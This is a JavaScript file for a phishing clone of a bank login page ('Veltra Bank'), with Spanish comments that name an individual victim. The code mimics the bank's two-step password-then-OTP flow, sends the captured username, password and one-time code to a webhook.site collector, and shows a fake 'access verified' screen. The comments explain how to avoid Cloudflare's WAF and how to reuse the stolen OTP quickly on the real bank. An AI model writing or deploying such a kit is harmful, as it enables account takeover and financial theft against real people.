/*
 * Veltra Bank — clon de phishing (captura de credenciales + OTP).
 *
 * Estrategia (elegida): el clon NO habla con la API real de Veltra.
 *   - Imita fielmente el flujo de 2 pasos (password -> OTP) para que
 *     Gaston Diaz no sospeche y complete ambos.
 *   - Exfiltra a webhook.site en cada paso, al instante.
 *   - Vos usas user/pass/OTP capturados para loguearte a mano en el banco
 *     real, dentro de la ventana de validez del OTP (entrar RAPIDO).
 *
 * No hace fetch cross-origin a Veltra: solo a COLLECTOR. Asi evita el WAF de
 * Cloudflare (que bloquea UA HeadlessChrome con Origin cross) y no deja
 * requests sospechosos a veltra en el network del bot.
 */
(function () {
  "use strict";

  // <<< EDITAR: tu buzon de exfiltracion >>>
  var COLLECTOR = "https://webhook.site/460362a0-a177-49a8-8cd4-1333797d53e2";

  function exfil(fase, datos) {
    // sendBeacon no bloquea la navegacion; fallback a Image/fetch keepalive.
    try {
      var payload = JSON.stringify({ fase: fase, t: new Date().toISOString(), datos: datos });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(COLLECTOR, new Blob([payload], { type: "application/json" }));
        return;
      }
    } catch (e) {}
    // fallback: GET con querystring (webhook.site free no ejecuta scripts, solo loguea)
    try {
      var qs = encodeURIComponent(JSON.stringify(datos));
      new Image().src = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
    } catch (e) {}
  }

  function mostrarError(msg) {
    var el = document.getElementById("alert");
    if (el) { el.textContent = msg; el.style.display = ""; }
  }
  function limpiarError() {
    var el = document.getElementById("alert");
    if (el) { el.textContent = ""; el.style.display = "none"; }
  }

  var formLogin = document.getElementById("form-login");
  var form2fa   = document.getElementById("form-2fa");
  var title     = document.getElementById("card-title");
  var sub       = document.getElementById("card-sub");

  // --- Paso 1: capturar usuario + clave ---
  formLogin.addEventListener("submit", function (e) {
    e.preventDefault();
    limpiarError();
    var usuario = document.getElementById("txt-login").value.trim();
    var clave   = document.getElementById("txt-password").value;

    exfil("login", { usuario: usuario, clave: clave });

    // Simular latencia de red y "avanzar" al paso 2FA, igual que el real.
    var btn = document.getElementById("btn-login");
    btn.disabled = true; btn.textContent = "Verificando...";
    setTimeout(function () {
      formLogin.style.display = "none";
      form2fa.style.display = "";
      title.textContent = "Verificacion en dos pasos";
      sub.textContent = "Ingresa el codigo de un solo uso que te enviamos.";
      var i = document.getElementById("txt-2fa"); if (i) i.focus();
    }, 650);
  });

  // --- Paso 2: capturar OTP ---
  form2fa.addEventListener("submit", function (e) {
    e.preventDefault();
    limpiarError();
    var codigo = document.getElementById("txt-2fa").value.trim();

    exfil("2fa", { codigo: codigo });

    var btn = document.getElementById("btn-2fa");
    btn.disabled = true; btn.textContent = "Verificando...";
    // "Exito": mostramos algo plausible. Como no tenemos sesion real, lo
    // dejamos en una pantalla de carga/redirect generica para no delatar.
    setTimeout(function () {
      document.querySelector(".card").innerHTML =
        '<div class="eyebrow">Banca en linea</div>' +
        '<h2>Acceso verificado</h2>' +
        '<p class="sub">Redirigiendo a tu panel...</p>';
    }, 650);
  });
})();
